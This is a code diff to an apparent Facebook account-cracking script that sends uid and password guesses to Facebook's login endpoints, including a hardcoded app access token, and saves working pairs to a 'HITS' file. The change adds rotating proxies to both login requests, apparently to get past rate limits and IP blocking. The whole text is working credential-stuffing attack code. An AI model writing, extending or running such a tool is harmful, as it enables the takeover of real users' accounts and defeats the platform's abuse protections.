@@ -4,6 +4,7 @@ import uuid
 import requests
 import config
 from utils import window1, creationyear
+from proxy import next_proxy
 
 G   = '\x1b[38;5;46m'
 Y   = '\x1b[38;5;220m'
@@ -80,7 +81,8 @@ def login_1(uid):
             }
             res = session.post(
                 'https://b-graph.facebook.com/auth/login',
-                data=data, headers=headers, allow_redirects=False
+                data=data, headers=headers, allow_redirects=False,
+                proxies=next_proxy()
             ).json()
             if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 _hit_line(1, uid, pw)
@@ -120,7 +122,7 @@ def login_2(uid):
                     f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                     f"&fb_api_req_friendly_name=authenticate&cpl=true"
                 )
-                po = session.get(url, headers=headers).json()
+                po = session.get(url, headers=headers, proxies=next_proxy()).json()
                 if 'session_key' in str(po):
                     _hit_line(2, uid, pw)
                     open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
